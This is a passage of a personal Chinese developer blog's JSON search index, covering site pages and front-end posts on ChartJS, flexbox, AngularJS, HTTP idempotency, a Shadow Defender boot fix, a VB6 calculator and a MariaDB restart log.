{"pages":[{"title":"","text":"chVgv7cWo0","link":"/baidu_verify_chVgv7cWo0.html"},{"title":"404 - PAGE NOT FOUND","text":"文章不见了！该文章或分类大概已被删除。返回上一页The article or category has been deleted, probably? Go back 如有疑问，可在下方留言反馈。","link":"/404/index.html"},{"title":"About Me","text":".heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } iMaeGoo 出自独立游戏 World of Goo 里小粘球的叫声，读作 /ɪ’mæɡu/ 不是爱妹狗啊，在家里电脑还是个大头（CRT）的时候就在玩了，其实头像也是在当时设定的，一直沿用至今。找不到女朋友誓不改头像 95后开发一枚，工作在郑州，爱好：前端、数码、动漫、手游、旅游 看的动漫：灵笼、罗小黑战记、转生史莱姆日记玩的手游：崩坏3（B服 牧耀佑七 ID:111478867）、明日方舟（官服 牧耀佑七#4728）、原神（天空岛 牧耀佑七 ID:100405870）数码设备：联想 R9000X 2021、iPad Pro 2018、iPhone 12 mini、坚果 Pro 2S、Amazfit GTR 博客主要写一些前端的技术文章，以及记录自己还没能解决的坑，但因为自己表达能力很差，更多只是写给自己看的，如果发现看不懂应该很正常 😰，不懂之处和可以改进的地方欢迎留言 🙏 本站文章如无特别声明，均为原创，采用 知识共享署名 4.0 国际许可协议 进行许可，转载请注明来源。 本站采用了 Hexo 静态博客框架，主题为 Icarus 个人修改版，本人写作能力很差。修改的主题不提供文档，有使用上的疑问可在 Issue 中提问，也可在博客中留言。 本站使用不蒜子和百度统计统计访客数据，包括但不限于您的 IP 地址、地理位置、访问页面等，继续浏览代表您接受我们收集此类信息。如您不接受，可选择禁用本站 Javascript 权限（例：选择地址栏左边的小锁 - 站点权限 - Javascript - 阻止），这不会影响您正常浏览站内博客文章，但会影响搜索、评论等功能。 感谢以下开源项目贡献者（整理得比较晚，无法全部列出，如有遗漏欢迎留言）： Name Author Description Hexo Hexo contributors Blog framework Icarus ppoffice A simple, delicate, and modern theme for Hexo Live2D fghrsh 看板娘插件 hexo-deployer-cos sdlzhd &amp; caikeal Hexo 腾讯云对象存储上传插件 pinyin-match xmflswood 拼音检索模块 Twikoo 我自己~ 评论系统 以及免费提供静态存储的：腾讯云, GitHub Pages, coding.me 以及免费提供 CDN 的：腾讯云, Cloudflare, jsDelivr, loli.net 以及免费提供自动化部署的：Azure DevOps 以及免费提供 API 支持的：腾讯云云开发 评论数据库, 不蒜子 访问量计数, 搏天API 二次元背景图, live2d.fghrsh.net 看板娘切换","link":"/about/index.html"},{"title":"Cookie Policy","text":"本网站可能使用 Cookies。此页面描述了我们如何以及为什么使用 Cookies。 我们如何使用 Cookies我们使用 Cookies 来统计访客数据，以及匿名地标识评论人。如果您不确定是否需要它们，建议您保留所有 Cookies。 禁用 Cookies您可以通过调整浏览器上的设置来阻止 Cookies 的设置（有关操作方法，请参阅浏览器帮助）。请注意，禁用 Cookies 会影响此网站以及您访问的许多其他网站的功能。因此，建议您不要禁用 Cookies。 评论相关的 Cookies我们将使用 Cookies 来 匿名地 标识您，以便在您返回我们的网站时识别您的身份，您的匿名身份将用于支持评论系统和阅读量统计。 第三方 Cookies我们使用一些第三方 Cookies，不蒜子 和 百度统计 来统计访客数据。 我们知道有关您的哪些信息？我们不要求您提供个人信息以访问我们的网站。我们可能会自动收到您的 IP 地址和用户代理（User Agent）。如果您发表评论，我们将收到您填写的昵称，邮箱和网址。 若您对本政策或我们的隐私实践有任何疑问或意见，请通过点击网站左侧的邮箱图标联系我们。","link":"/cookies/index.html"},{"title":"留言板","text":"留下足迹吧！","link":"/messages/index.html"},{"title":"My Friends","text":".article .content { overflow-x: hidden; } .friends { display: flex; align-items: stretch; justify-content: space-between; flex-wrap: wrap; margin: -6px; } .friends .friend { margin: 6px; min-width: 350px; flex: 1; display: flex; align-items: center; justify-content: center; border-radius: 5px; border: 1px solid #e2e2e2; } .night .friends .friend { border-color: #434a56; } .friends .friend .friend-avatar { flex-shrink: 0; margin: 12px; width: 80px; height: 80px; border-radius: 40px; background-color: #e2e2e2; background-size: cover; background-position: center; font-size: 32px; line-height: 80px; text-align: center; } .friends .friend .friend-detail { flex: 1; display: flex; flex-direction: column; margin-top: 12px; margin-right: 12px; margin-bottom: 12px; line-height: 26px; } 排名按添加顺序。Sorted by added time. M 网站名称：maemoの風船が！&nbsp; 网站地址：https://maemo.cc 网站名称：刘向洋的博客&nbsp; 网站地址：https://liuxiangyang.space 网站简介：记录工作,记录生活 网站名称：米米的博客&nbsp; 网站地址：https://zhangshuqiao.org 网站简介：米米的博客！！ 网站名称：辣椒の酱 网站地址：https://removeif.github.io 网站简介：后端开发，技术分享 网站名称：Sakitami的集装箱&nbsp; 网站地址：https://blog.skihome.xyz 网站简介：我已经无敌了！ 明 网站名称：明月逐人归&nbsp; 网站地址：https://mingshan.fun 网站名称：宇宙湾&nbsp; 网站地址：https://yuzhouwan.com 网站简介：主要是大数据和人工智能的原创文章。 网站名称：Ray’s Blog 网站地址：https://raycoder.me 网站简介：夜晚再黑，也压不过雪的白 网站名称：一见倾心&nbsp; 网站地址：https://bitcrush.top 网站简介：你要很酷，世界才不会残酷 白 网站名称：白程序员的自习室 网站地址：https://www.studytime.xin 网站简介：白程序员的自习室，在这里有程序员的故事和技术，分享日常学习的知识和技术。 网站名称：Trainoo 网站地址：https://trainoo.gitee.io 网站简介：A simple man living a simple life 网站名称：YunShu’Blog&nbsp; 网站地址：https://www.yunshu.site 网站简介：爱好记录,喜欢分享~ 网站名称：Frytea’s Blog&nbsp; 网站地址：https://blog.frytea.com 网站名称：Kitcham 的归墟&nbsp; 网站地址：https://blog.uiharu.top 网站简介：生命洋溢亦无凭无记 网站名称：皮皮凛の小窝&nbsp; 网站地址：https://owomoe.net 网站简介：永远相信美好的事情即将发生~ 网站名称：ADD-SP‘s Blog 网站地址：https://www.addesp.com 网站简介：Hello World！ 网站名称：Heo 网站地址：https://blog.zhheo.com 网站简介：爱折腾的设计师 网站名称：Fungit&nbsp; 网站地址：https://fungit.org 网站简介：木秀于林 风必摧之 网站名称：IT小跟班 网站地址：https://blog.it-follower.com 网站简介：分享技术，记录生活，感悟人生 网站名称：I Am I&nbsp; 网站地址：https://5ime.cn 网站简介：永远相信美好的事情即将发生 网站名称：Android&nbsp; 网站地址：https://android99.me 网站简介：矩阵 网站名称：小N同学&nbsp; 网站地址：https://www.nesxc.com 网站简介：青石落晚巷 故人未还乡 网站名称：Itpika’s Blog 网站地址：https://itpika.com 网站简介：皮卡空间站 网站名称：Steve Li’s Blog&nbsp; 网站地址：https://stevelbr.ga 网站简介：学习交流 网站名称：小嘉的部落格 网站地址：https://blog.imzjw.cn 网站简介：好记性不如烂笔头 网站名称：Reself’s Blog (ง •_•)ง&nbsp; 网站地址：https://xiaobaicai.fun 网站简介：我的童话深林不在阴雨绵绵 网站名称：JeckXu&nbsp; 网站地址：https://jeckxu.cn 网站简介：嵌入式技术记录与分享 网站名称：琉仙の后花园&nbsp; 网站地址：https://blog.lx101.cn 网站简介：一起来种花家呀 网站名称：暮雨千泷 网站地址：https://www.myql.xyz 网站简介：青天白日梦神仙 网站名称：guole’s Blog&nbsp; 网站地址：https://guole.fun 网站简介：保持理智，相信明天 网站名称：呆坐于人海の博客 网站地址：https://weilong98.com 网站简介：正在努力学习的小白 网站名称：陈鑫磊的博客&nbsp; 网站地址：https://www.cxl2020mc.top 网站简介：这个人太懒了，什么都没有写…… 网站名称：飞鸟&nbsp; 网站地址：https://lzxjack.top 网站简介：一只平凡的鸟罢了 异常友链 | 如存在异议请在评论区留言 网站名称：Flexiston&nbsp; 网站地址：https://www.flexiston.com 网站简介：长风破浪会有时，直挂云帆济沧海 备注：HTTPS 证书过期 网站名称：Lee 网站地址：https://blog.leeio.cn 网站简介：积跬步以至千里，积怠情以至深渊。 备注：友链页面无法正常访问 如您希望交换友情链接，敬请在评论区留言。本站目前仅接受个人博客网站的友链申请。 本站友链信息如下： Gravatar：https://www.gravatar.com/avatar/05bb2aa29c9da6ef65fabd321135e7b6?s=128网站图标：https://www.imaegoo.com/images/avatar.jpg网站名称：iMaeGoo’s Blog网站地址：https://www.imaegoo.com网站简介：虹墨空间站","link":"/friends/index.html"}],"posts":[{"title":"Android版本 (1.0~8.1) 与API Level (SDK版本1~27) 对应表","text":"什么是 API 级别？API 级别是一个对 Android 平台版本提供的框架 API 修订版进行唯一标识的整数值。 Android 平台提供了一种框架 API，应用可利用它与底层 Android 系统进行交互。 该框架 API 由以下部分组成： 一组核心软件包和类 一组用于声明清单文件的 XML 元素和属性 一组用于声明和访问资源的 XML 元素和属性 一组 Intent 一组应用可请求的权限，以及系统中包括的权限强制执行。 每个后续版本的 Android 平台均可包括对其提供的 Android 应用框架 API 的更新。 框架 API 更新的设计用途是使新 API 与早期版本的 API 保持兼容。 也就是说，大多数 API 更改都是新增更改，会引入新功能或替代功能。 在 API 的某些部分得到升级时，旧版的被替换部分将被弃用，但不会被移除，这样现有应用仍可使用它们。 在极少数情况下，可能会修改或移除 API 的某些部分，但通常只有在为了确保 API 稳健性以及应用或系统安全性时，才需要进行此类更改。 所有其他来自早期修订版的 API 部分都将结转，不做任何修改。 Android 平台提供的框架 API 使用叫做“API 级别”的整数标识符指定。 每个 Android 平台版本恰好支持一个 API 级别，但隐含了对所有早期 API 级别（低至 API 级别 1）的支持。 Android 平台初始版本提供的是 API 级别 1，后续版本的 API 级别递增。 下表列出了各 Android 平台版本支持的 API 级别。 平台版本 API 级别 VERSION_CODE Android 8.1 27 Oreo Android 8 26 Oreo Android 7.1 25 Nougat Android 7.0 24 Nougat Android 6.0 23 Marshmallow Android 5.1 22 LOLLIPOP_MR1 Android 5.0 21 LOLLIPOP Android 4.4W 20 KITKAT_WATCH Android 4.4 19 KITKAT Android 4.3 18 JELLY_BEAN_MR2 Android 4.2、4.2.2 17 JELLY_BEAN_MR1 Android 4.1、4.1.1 16 JELLY_BEAN Android 4.0.3、4.0.4 15 ICE_CREAM_SANDWICH_MR1 Android 4.0、4.0.1、4.0.2 14 ICE_CREAM_SANDWICH Android 3.2 13 HONEYCOMB_MR2 Android 3.1.x 12 HONEYCOMB_MR1 Android 3.0.x 11 HONEYCOMB Android 2.3.3、2.3.4 10 GINGERBREAD_MR1 Android 2.3、2.3.1、2.3.2 9 GINGERBREAD Android 2.2.x 8 FROYO Android 2.1.x 7 ECLAIR_MR1 Android 2.0.1 6 ECLAIR_0_1 Android 2.0 5 ECLAIR Android 1.6 4 DONUT Android 1.5 3 CUPCAKE Android 1.1 2 BASE_1_1 Android 1.0 1 BASE 参考：https://developer.android.com/guide/topics/manifest/uses-sdk-element.htmlhttps://developer.android.com/about/dashboards/index.html","link":"/2018/android-api-level/"},{"title":"ChartJS鼠标移到图例上显示手形","text":"在Chart options中添加： 123456789101112131415161718// 给图例加手势legend: { onHover: function(e) { e.target.style.cursor = 'pointer'; }},// 给图加手势hover: { onHover: function(e) { var point = this.getElementAtEvent(e); if (point.length) { e.target.style.cursor = 'pointer'; } else { e.target.style.cursor = 'default'; } }}","link":"/2018/chartjs-pointer-cursor/"},{"title":"如何实现flex布局下div等宽且内部文字可以溢出显示","text":"效果如图： HTML结构：123456789101112&lt;div class=&quot;labels&quot;&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;1&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;2&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;3&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;4&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;Today&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;6&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;7&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;8&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;9&lt;/span&gt;&lt;/div&gt; &lt;div class=&quot;label&quot;&gt;&lt;span&gt;10&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; CSS样式：12345678910111213141516171819202122232425262728293031.labels { display: -webkit-flex; display: -ms-flexbox; display: flex; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -ms-flex-align: center; align-items: center; .label { -webkit-flex: 1; -ms-flex: 1; flex: 1; display: -webkit-flex; display: -ms-flexbox; display: flex; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-justify-content: center; -ms-flex-pack: center; justify-content: center; overflow: hidden; span { overflow: visible; position: absolute; line-height: 0; } }}","link":"/2018/flex-same-width-overflow/"},{"title":"Create, Update 和 HTTP 幂等性","text":"译自原文：https://stormpath.com/blog/put-or-post原作者：Stormpath 团队 2016/5/12更新：观看 Stormpath Hazlewood 的介绍 REST + JSON API 设计最佳实践. 别忘了， Stormpath 无需代码保护您的 API 的认证 创建、更新和 HTTP 幂等性对于构建基于 REST 的 api 的开发人员来说，有大量的错误信息和关于何时使用 http 发布和何时使用 http POST 的一些可理解的混淆。有人说 POST 应用于创建资源，PUT 应用于修改资源. 还有人说 PUT 应用于创建资源 POST 应用于修改资源。两者都不太正确。 通常，开发人员认为每个 HTTP 方法都与 CRUD 操作有 1:1 的关系： CRUD HTTP Create POST Read GET Update PUT Delete DELETE 这可以是真的，特别是GET和DELETE，但当涉及到哪些 HTTP 方法应该与创建和更新关联时，答案归结为 幂等性。 幂等性幂等性 是 HTTP 规范 中的一个重要概念，无论执行同一请求多少次，幂等 HTTP 请求都将导致服务器的相同状态。 GET，HEAD，PUT，和 DELETE 都具有此属性，但 POST 没有。 为了帮助说明幂等性，我们将使用一个帐户集合(*/accounts)，为了简洁起见，我们假定，每个帐户资源有三属性称为givenName，surname，和 status. 假设您使用 HTTP PUT 方法提交更新请求。在body里，你把 givenName 值定为 “John”，”surname” 值定为 “Smith”。然后，您提交另一个请求 HTTP PUT请求，这次设置 “givenName” 为 “Johnny”。这是幂等吗？不。为什么？因为其他请求 可能 在我们两个请求之间更改了帐户资源的服务器状态。例如，在两个请求之间，”status” 可能被更改为 “blocked”。我们的示例请求无法保证服务器上帐户的状态在重复时是 _相同的_。 请求： 12345HTTP/1.1 PUT /accounts/abcdef1234{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;} 在我们的两个请求之后可能的帐户状态（由于其他请求的副作用）： 12345{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;enabled&quot;} 或者 12345{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;disabled&quot;} 引述 Dino Chiesa，“PUT 意味着放入一个资源 - 将任何在给定的 URL 可用的资源用不同的资源完全替换。” 使用 “PUT” 请求时, 必须将可用的属性 / 值（而不仅仅是要更改的） 全部 发送。如果我们想发送“disabled”的状态, 而不是 “givenName” 和 “surname”, PUT调用将是幂等的，且消除副作用的。幂等性是 HTTP 规范的基本属性, 必须坚持以保证 web 的互通性和规模化。 最后, 我们应该指出, HTTP 幂等性 仅适用于 服务端 状态, 而不是客户端状态。例如, 客户端可以成功地发送服务器幂等请求, 然后再次发送相同的精确服务器幂等请求, 并遇到错误（例如, 可能是由于服务器中的约束冲突）, 这完全是 “合法的”。只要 http 请求导致服务器上相同的状态，就能维持 HTTP 幂等性。 HTTP POST vs HTTP PUT既然 幂等性 是明确的, 那么在执行创建和更新操作时应该使用哪一种方法？以下是适当使用每个方法时的快速参考。 创建当您不知道资源标识符时, 使用 POST 创建资源。使用 POST 创建后, 最好的做法是返回 “201 Created” 的状态和新创建的资源的位置, 因为在提交时它的位置未知。这允许客户端稍后访问新资源 (如果需要)。 1234HTTP/1.1 POST /accounts{ ...} 返回： 12201 CreatedLocation: https://api.stormpath.com/accounts/abcdef1234 当允许客户端指定新创建的资源的资源标识时, 请使用 PUT。但是请记住, 既然 PUT 是幂等请求, 你必须发送所有可能的值。 123456HTTP/1.1 PUT /accounts/abcdef1234{ &quot;givenName&quot;: &quot;John&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;enabled&quot;} 更新您可以使用 POST 来发送所有可用值或仅提供可用值的子集: 12345HTTP/1.1 POST /accounts/abcdef1234{ &quot;status&quot;: &quot;disabled&quot;}Response 200 OK 如果要使用 PUT 更新资源, 则必须是完整的资源更新；必须在 “提交” 请求中发送所有属性值以保证幂等性。 当需要或需要发送 所有 可用值以遵循幂等性要求时, 请使用 PUT, 例如, 在完全更新资源的情况下。 1234567HTTP/1.1 PUT /accounts/abcdef1234{ // 完全更新资源 &quot;givenName&quot;: &quot;J&quot;, &quot;surname&quot;: &quot;Smith&quot;, &quot;status&quot;: &quot;Enabled&quot;} 您也可以使用 POST 来发送所有值, 服务器状态可能与 PUT 完全相同–它只是不需要由 HTTP 规范来进行。请注意, 幂等性与 HTTP 缓存服务器可缓存的相关性很强, 因此 POST 请求通常不会被缓存。如果您对此缓存副作用感觉OK, 则可以使用 POST 来进行完全更新和部分更新。 POST 是当前唯一的非幂等方法。HTTP 规范是非常通用的, 并且基本上将其声明为 “服务器处理指令”。这意味着在 POST 请求中做任何您想做的事情是 “安全的”。 最后, 我们应该注意到还有另一种方法尚未最后确定的 HTTP 规范, 称为 PATCH。PATCH 可替代 POST 进行部分更新。然而, 由于 POST 已经可以简单地处理部分更新, 因此似乎没有足够的理由使用 PATCH，如果 HTTP 规范委员会批准，PATCH 将并入 POST 成为唯一的其他非幂等 HTTP 方法。","link":"/2018/put-or-post/"},{"title":"Shadow Defender 安装后启动蓝屏、无法启动、不兼容 Win10 解决方案","text":"Windows 10 系统驱动更新快，经常遇到更新完和 Shadow Defender 不兼容的情况，有时甚至造成 Windows 无法启动并且自动修复失败，这时候就要先禁用然后等待 Shadow Defender 更新。 如果当前启用了影子模式请从可启动的 CD/DVD/USB 设备启动, 然后删除隐藏文件 “C:\\diskpt0.sys” 并重新启动, 这将禁用阴影模式。 如果当前未启用影子模式请将 “C:\\Windows\\system32\\drivers\\null.sys” 复制到 “C:\\Windows\\system32\\drivers\\diskpt.sys”，这将覆盖 SD 使用的驱动程序，然后重新启动。","link":"/2018/shadow-defender-blue-screen/"},{"title":"VB6.0巧用ScriptControl实现多功能科学计算器","text":"下载地址：http://download.csdn.net/download/imaegoo/5646305 1234567891011121314151617181920212223Private Sub Command_Click() On Error GoTo Command_Click_Err0 Dim ScriptControl As Object, Psw$2 Dim code As String100 code = &quot;Function encodePwd&quot; &amp; vbCrLf &amp; &quot;encodePwd = &quot; &amp; Text1.Text &amp; vbCrLf &amp; &quot;End Function&quot;102 Set ScriptControl = CreateObject(&quot;MSScriptControl.ScriptControl&quot;)104 ScriptControl.Language = &quot;VBScript&quot;106 ScriptControl.Timeout = -1108 ScriptControl.AddCode code110 Psw = ScriptControl.Run(&quot;encodePwd&quot;)112 Text2.Text = Psw114 Text1.SetFocusExit Sub Command_Click_Err:MsgBox &quot;::&gt;_&lt;:: 有以下错误&quot; &amp; vbCrLf &amp; Err.Description &amp; vbCrLf &amp; _ &quot;发生在 VBS语言计算器.MainForm.Command_Click &quot; &amp; _ &quot;的第 &quot; &amp; Erl &amp; &quot; 行&quot; &amp; vbCrLf &amp; vbCrLf &amp; &quot;检查一下你的语法是否正确 ：）&quot;, _ vbExclamation + vbOKOnly, &quot;出错啦！&quot;Resume Next'footEnd Sub","link":"/2018/vb-calculator/"},{"title":"AngularJS &lt;input&gt; 输入框自适应内容宽度","text":"在Gist上找到的一个directive，用来让input输入框的宽度自适应内容宽度。https://gist.github.com/mbenford/8016984 原理是生成一个相同样式的，隐藏的span，通过span的宽度动态改变input的宽度。同时兼顾了input有placeholder的情况。 如果是在比较大的系统中，可以用throttle节流阀包装一下resize方法，避免性能问题。 如果是textarea，对应的directive在这里：https://github.com/monospaced/angular-elastic 效果： See the Pen input auto size directive by iMaeGoo (@iMaeGoo) on CodePen. HTML1234&lt;div ng-app=&quot;Test&quot; ng-controller=&quot;MainCtrl&quot;&gt; &lt;p&gt;Hello {{name}}!&lt;/p&gt; &lt;input type=&quot;text&quot; ng-model=&quot;name&quot; placeholder=&quot;type here&quot; autosize/&gt;&lt;/div&gt; JS1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var app = angular.module('Test', []);app.controller('MainCtrl', function ($scope) { $scope.name = '';});app.directive('autosize', function ($document) { return { require: 'ngModel', link: function (scope, element, attrs, ctrl) { var span; span = angular.element('&lt;span&gt;&lt;/span&gt;'); span.css('display', 'none') .css('width', 'auto'); element.parent().append(span); function resize(value) { var style = getComputedStyle(element[0]); span.css('font', style.font) .css('letter-spacing', style.letterSpacing) .css('word-spacing', style.wordSpacing) .css('padding', style.padding); if (value != null &amp;&amp; value.length === 0) { value = element.attr('placeholder') || ''; } span.text(value); span.css('display', ''); try { element.css('width', span.prop('offsetWidth') + 'px'); } finally { span.css('display', 'none'); } }; ctrl.$parsers.unshift(function (value) { resize(value); return value; }); ctrl.$formatters.unshift(function (value) { resize(value); return value; }); } };});","link":"/2019/ajs-auto-width-input/"},{"title":"AngularJS 给 directive scope 绑定的 function 传参","text":"如果我们想要给directive的scope中绑定的方法传递参数，需要传递对象，而不是直接传值。 举个栗子，这里的clickOutside是从用的地方传入的一个方法，debug时我们会发现绑进来的clickOutside并不是我们传的clickOutSideAction。 12345678910111213app.directive('clickOutSide', ['$document', function($document) { return { restrict: 'A', scope: { clickOutside: '&amp;' }, link: function (scope, el) { $document.on('click', function (e) { scope.clickOutside(); }); } }}]); 1&lt;div data-click-out-side click-Outside=&quot;$ctrl.clickOutSideAction()&quot;&gt;&lt;/div&gt; 如果需要在这里给clickOutSideAction传参数，应该这样改： 12345678910app.directive('clickOutSide', ['$document', function($document) { return { ... link: function (scope, el) { ... scope.clickOutside({event: e}); ... } }}]); 1&lt;div data-click-out-side click-Outside=&quot;$ctrl.clickOutSideAction(event)&quot;&gt;&lt;/div&gt; 好处是在实际使用directive的地方，不需要考虑参数列表顺序，只需要保证参数名称正确。","link":"/2019/ajs-function-in-directive-scope/"},{"title":"AngularJS表达式无法引用$rootScope变量","text":"Angular version: 1.6.6在HTML中想使用$rootScope中的变量时发现取不到，加上$root之后解决。 HTML表达式 对应的JS变量 {{abc}} | $scope.abc {{$ctrl.abc}} | this.abc {{$root.abc}} | $rootScope.abc 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.6.6/angular.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body ng-app=&quot;myApp&quot;&gt;&lt;div ng-controller=&quot;myCtrl2 as ctrl2&quot;&gt;&lt;/div&gt;&lt;div ng-controller=&quot;myCtrl as ctrl&quot;&gt;&lt;input type=&quot;text&quot; ng-if=&quot;ctrl.name1&quot; ng-model=&quot;ctrl.name1&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; ng-if=&quot;name2&quot; ng-model=&quot;name2&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; ng-if=&quot;$root.name3&quot; ng-model=&quot;name3&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;script&gt;var app = angular.module('myApp', []);app.controller('myCtrl', function($scope) { this.name1 = &quot;this.iMaeGoo&quot;; $scope.name2= &quot;$scope.iMaeGoo&quot;;});app.controller('myCtrl2', function($rootScope) { $rootScope.name3= &quot;$rootScope.iMaeGoo&quot;;});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2019/ajs-rootscope-in-html/"},{"title":"Bitnami MariaDB 重启失败记录","text":"自动部署的 Magento 附带的 MariaDB 镜像第一次启动能够成功，但 stop 之后就无法再次启动。启动命令 docker-compose up -d，重启命令 docker-compose restart， 关键 log： 123InnoDB: Assertion failure in file /bitnami/blacksmith-sandox/mariadb-10.2.28/storage/innobase/dict/dict0dict.cc line 1467InnoDB: Failing assertion: table-&gt;can_be_evicted[ERROR] mysqld got signal 6 ; 详细的 stdout 如下—— 第一次启动docker log12345678910111213141516171819202122232425262728293031323334353637383940414243 03:20:42.43 Welcome to the Bitnami mariadb container 03:20:42.43 Subscribe to project updates by watching https://github.com/bitnami/bitnami-docker-mariadb 03:20:42.43 Submit issues and feature requests at https://github.com/bitnami/bitnami-docker-mariadb/issues 03:20:42.44 Send us your feedback at containers@bitnami.com 03:20:42.44 03:20:42.44 INFO ==&gt; ** Starting MariaDB setup ** 03:20:42.48 INFO ==&gt; Validating settings in MYSQL_*/MARIADB_* env vars 03:20:42.48 WARN ==&gt; You set the environment variable ALLOW_EMPTY_PASSWORD=yes. For safety reasons, do not use this flag in a production environment. 03:20:42.49 INFO ==&gt; Initializing mariadb database 03:20:42.50 INFO ==&gt; Installing database 03:20:47.95 INFO ==&gt; Starting mariadb in background 03:20:48.97 INFO ==&gt; Configuring authentication 03:20:49.12 INFO ==&gt; Running mysql_upgrade 03:20:49.65 INFO ==&gt; Stopping mariadb 03:20:53.69 INFO ==&gt; ** MariaDB setup finished! ** 03:20:53.77 INFO ==&gt; ** Starting MariaDB **2019-11-08 3:20:53 140200746645312 [Note] /opt/bitnami/mariadb/sbin/mysqld (mysqld 10.2.28-MariaDB) starting as process 1 ...2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Uses event mutexes2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Compressed tables use zlib 1.2.82019-11-08 3:20:53 140200746645312 [Note] InnoDB: Using Linux native AIO2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Number of pools: 12019-11-08 3:20:53 140200746645312 [Note] InnoDB: Using SSE2 crc32 instructions2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Completed initialization of buffer pool2019-11-08 3:20:53 140200228304640 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Highest supported file format is Barracuda.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: 128 out of 128 rollback segments are active.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Creating shared tablespace for temporary tables2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2019-11-08 3:20:53 140200746645312 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2019-11-08 3:20:53 140200746645312 [Note] InnoDB: Waiting for purge to start2019-11-08 3:20:54 140200746645312 [Note] InnoDB: 5.7.28 started; log sequence number 16200062019-11-08 3:20:54 140199854065408 [Note] InnoDB: Loading buffer pool(s) from /bitnami/mariadb/data/ib_buffer_pool2019-11-08 3:20:54 140199854065408 [Note] InnoDB: Buffer pool(s) load completed at 191108 3:20:542019-11-08 3:20:54 140200746645312 [Note] Plugin 'FEEDBACK' is disabled.2019-11-08 3:20:54 140200746645312 [Note] Server socket created on IP: '0.0.0.0'.2019-11-08 3:20:54 140200746645312 [Warning] 'proxies_priv' entry '@% root@58577f4b0595' ignored in --skip-name-resolve mode.2019-11-08 3:20:54 140200746645312 [Note] Reading of all Master_info entries succeeded2019-11-08 3:20:54 140200746645312 [Note] Added new Master_info '' to hash table2019-11-08 3:20:54 140200746645312 [Note] /opt/bitnami/mariadb/sbin/mysqld: ready for connections.Version: '10.2.28-MariaDB' socket: '/opt/bitnami/mariadb/tmp/mysql.sock' port: 3306 Source distribution 停止123456789102019-11-15 15:08:01 140200219911936 [Note] /opt/bitnami/mariadb/sbin/mysqld (initiated by: unknown): Normal shutdown2019-11-15 15:08:01 140200219911936 [Note] Event Scheduler: Purging the queue. 0 events2019-11-15 15:08:01 140200105715456 [Note] InnoDB: FTS optimize thread exiting.2019-11-15 15:08:01 140200219911936 [Note] InnoDB: Starting shutdown...2019-11-15 15:08:01 140199854065408 [Note] InnoDB: Dumping buffer pool(s) to /bitnami/mariadb/data/ib_buffer_pool2019-11-15 15:08:01 140199854065408 [Note] InnoDB: Instance 0, restricted to 2047 pages due to innodb_buf_pool_dump_pct=252019-11-15 15:08:01 140199854065408 [Note] InnoDB: Buffer pool(s) dump completed at 191115 15:08:012019-11-15 15:08:02 140200219911936 [Note] InnoDB: Shutdown completed; log sequence number 4822953382019-11-15 15:08:02 140200219911936 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2019-11-15 15:08:02 140200219911936 [Note] /opt/bitnami/mariadb/sbin/mysqld: Shutdown complete 重启后docker log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106 16:16:36.31 Welcome to the Bitnami mariadb container 16:16:36.31 Subscribe to project updates by watching https://github.com/bitnami/bitnami-docker-mariadb 16:16:36.32 Submit issues and feature requests at https://github.com/bitnami/bitnami-docker-mariadb/issues 16:16:36.32 Send us your feedback at containers@bitnami.com 16:16:36.32 16:16:36.32 INFO ==&gt; ** Starting MariaDB setup ** 16:16:36.35 INFO ==&gt; Validating settings in MYSQL_*/MARIADB_* env vars 16:16:36.35 WARN ==&gt; You set the environment variable ALLOW_EMPTY_PASSWORD=yes. For safety reasons, do not use this flag in a production environment. 16:16:36.35 INFO ==&gt; Initializing mariadb database 16:16:36.36 INFO ==&gt; Using persisted data 16:16:36.37 INFO ==&gt; Running 